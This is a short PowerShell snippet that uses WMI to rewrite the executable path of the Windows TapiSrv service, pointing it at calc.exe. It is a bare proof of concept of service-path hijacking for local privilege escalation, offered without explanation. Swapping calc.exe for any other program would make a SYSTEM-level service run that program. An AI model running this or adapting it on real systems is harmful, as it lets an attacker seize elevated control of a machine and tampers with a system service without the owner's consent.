Get-WmiObject win32_service -filter "Name='TapiSrv'" `
    | Invoke-WmiMethod -Name Change `
    -ArgumentList @($null,$null,$null,$null,$null, `
    "%windir%\system32\calc.exe")